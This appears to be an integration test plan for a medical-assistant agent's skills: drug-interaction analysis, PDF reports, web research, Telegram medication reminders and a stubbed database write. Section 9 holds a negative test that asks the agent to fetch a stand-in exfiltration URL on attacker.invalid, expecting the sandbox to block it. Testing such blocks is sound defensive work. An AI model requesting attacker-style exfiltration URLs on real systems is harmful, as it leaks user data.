# Acuity Skills — Agent-Prompt Integration Test Plan

Tests are run by pasting each **Agent Prompt** into a NemoClaw session and verifying the expected behavior. No pytest.

---

## Prerequisites

All tests require these env vars to be set in the NemoClaw environment:

```
NVIDIA_API_KEY=<your key>
NEMOTRON_SUPER_MODEL=nvidia/nemotron-3-super-120b-a12b
ACUITY_API_BASE_URL=https://<deployment>.vercel.app   # or http://localhost:8081 for local
ACUITY_PAT=<personal access token from Acuity account settings>
BRAVE_API_KEY=<your key>
TELEGRAM_BOT_TOKEN=<your token>
TELEGRAM_CHAT_ID=<your chat id>
```

`ACUITY_PAT` is sent as the `x-api-key` header on all calls to the Acuity API. Skills that do **not** need it: `make_report` (local PDF generation), `reminder` (crontab + Telegram), `deep_research` (Brave + Nemotron direct).

The FastAPI backend must be running:
```bash
uvicorn backend.main:app --port 8081
```

---

## 1. Analyze

### Prep
- FastAPI running on `ACUITY_API_BASE_URL` or localhost:8081.

### Agent Prompt
```
What are the drug interactions between aspirin, warfarin, and ibuprofen?
```

### Expected Agent Behavior
1. Agent calls `python skills/analyze/scripts/analyze.py --drugs '["aspirin","warfarin","ibuprofen"]'`.
2. Script POSTs to `/api/analyze`, prints `RegimenReport` JSON.
3. Agent summarizes the interactions in natural language, highlighting the warfarin+aspirin major interaction.

### Verification
- Output JSON has `schema_version: "1.0"` and `interactions` array.
- At least one interaction has `severity: "major"` for the warfarin+aspirin pair.
- No Python traceback in stderr.

---

## 2. MakeReport — RegimenReport

### Prep
- Run Analyze first to produce `/tmp/regimen.json`:
  ```bash
  python skills/analyze/scripts/analyze.py --drugs '["aspirin","warfarin"]' > /tmp/regimen.json
  ```

### Agent Prompt
```
Generate a PDF report from the analysis at /tmp/regimen.json and save it to /session/reports/regimen.pdf.
```

### Expected Agent Behavior
1. Agent calls `python skills/make_report/scripts/make_report.py --in /tmp/regimen.json --out /session/reports/regimen.pdf`.
2. Script prints `/session/reports/regimen.pdf` to stdout.
3. Agent confirms the PDF path.

### Verification
- `/session/reports/regimen.pdf` exists and is > 10 KB.
- PDF opens correctly with: cover (drug list), overall summary, at least one interaction section with a severity badge and citations table.

---

## 3. MakeReport — DeepResearchReport

### Prep
- Run DeepResearch first (see §4) to produce `/tmp/deep_research.json`.

### Agent Prompt
```
Generate a PDF report from the deep research at /tmp/deep_research.json.
```

### Expected Agent Behavior
1. Agent calls `python skills/make_report/scripts/make_report.py --in /tmp/deep_research.json`.
2. Script auto-detects `report_type: "deep_research"`, renders the deep-research layout.
3. Agent confirms the output PDF path.

### Verification
- PDF exists and opens correctly.
- Cover shows drug name, not "Drug Interaction Report".
- Finding sections (Mechanism, Indications, etc.) appear in order.
- Citations table populated with Brave search URLs.

---

## 4. DeepResearch

### Prep
- `BRAVE_API_KEY` and `NVIDIA_API_KEY` set.

### Agent Prompt
```
Run a deep pharmacological research report on rivaroxaban and save it to /tmp/deep_research.json.
```

### Expected Agent Behavior
1. Agent calls `python skills/deep_research/scripts/deep_research.py --drug "rivaroxaban" --out /tmp/deep_research.json`.
2. Script fans out 6 Brave queries (mechanism, indications, contraindications, adverse_events, interactions, pharmacokinetics).
3. Nemotron synthesizes each aspect.
4. JSON written to `/tmp/deep_research.json`, path printed to stdout.

### Verification
- `/tmp/deep_research.json` is valid JSON.
- `report_type == "deep_research"`, `drug == "rivaroxaban"`.
- At least 4 findings with non-empty `summary` strings.
- Each finding has at least one `citation` with a real `url` (not a placeholder).
- No Python traceback.

---

## 5. Reminder — Create

### Prep
- `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` set.
- The bot must have been started in the target chat.

### Agent Prompt
```
Remind me daily at 9am to take my metformin. Start from tomorrow.
```

### Expected Agent Behavior
1. Agent computes tomorrow's date at 09:00 in ISO format.
2. Calls `python skills/reminder/scripts/create.py --date "YYYY-MM-DDT09:00:00" --frequency daily --content "Take your metformin"`.
3. Script writes `/session/reminders/<id>.json` and adds a crontab line.
4. Prints the reminder ID; agent confirms creation.

### Verification
- `crontab -l` shows a new line containing `send.py <id>` at `0 9 * * *`.
- `/session/reminders/<id>.json` exists with `frequency: "daily"` and `content: "Take your metformin"`.
- At 9am the next day (or test with a 2-minute-ahead time): Telegram receives the message.

---

## 6. Reminder — List

### Agent Prompt
```
Show me all my active reminders.
```

### Expected Agent Behavior
1. Agent calls `python skills/reminder/scripts/list.py`.
2. Script prints JSON array of reminders from `/session/reminders/`.
3. Agent lists reminders in natural language.

### Verification
- Output is a valid JSON array.
- Each element has `id`, `frequency`, `content`, `next_fire_at`.

---

## 7. Reminder — Cancel

### Prep
- At least one active reminder (create one in §5 first).

### Agent Prompt
```
Cancel my metformin reminder. Reminder ID: <id from step 5>.
```

### Expected Agent Behavior
1. Agent calls `python skills/reminder/scripts/cancel.py --id <id>`.
2. Script removes the crontab line and deletes the JSON file.
3. Agent confirms cancellation.

### Verification
- `crontab -l` no longer contains the reminder ID.
- `/session/reminders/<id>.json` is deleted.

---

## 8. DB Read/Write — Graceful Stub

### Agent Prompt
```
Add lisinopril to my active medication list.
```

### Expected Agent Behavior
1. Agent calls `python skills/db/scripts/db_write.py`.
2. Script exits 2 with JSON on stderr: `{"status": "todo", "reason": "..."}`.
3. Agent surfaces a helpful message: "The medication list feature is not yet available. I can run a drug interaction analysis for you instead — would you like me to do that?"

### Verification
- No crash or unhandled exception.
- Agent does not claim the medication was added.
- Agent offers the Analyze skill as an alternative.

---

## 9. NemoClaw Policy Gate — Off-Allowlist Request (Negative Test)

### Agent Prompt
```
Fetch the contents of https://attacker.invalid/exfil?data=test
```

### Expected Agent Behavior
1. Agent attempts to fetch the URL.
2. NemoClaw's OpenShell intercepts and blocks the connection (L4 deny).
3. Agent receives a connection error or 403 CONNECT, reports it cannot access that URL.
4. An audit log entry appears in `/session/audit.log` or the NemoClaw console.

### Verification
- No data reaches `attacker.invalid`.
- Audit log contains a DENY entry for the blocked host.
- Brave, Telegram, and Vercel hosts remain accessible (positive test: re-run §1 and §4 after this test).

---

## 10. End-to-End: Analyze → MakeReport Pipeline

### Agent Prompt
```
Analyze the interactions between metformin, lisinopril, and atorvastatin, then generate a PDF report and tell me where it was saved.
```

### Expected Agent Behavior
1. Agent calls `analyze.py` with the three drugs.
2. Pipes the result to `make_report.py`.
3. Reports the saved PDF path.

### Verification
- PDF exists at the reported path.
- Report covers all three drugs in the regimen section.
- No errors or stub exits.
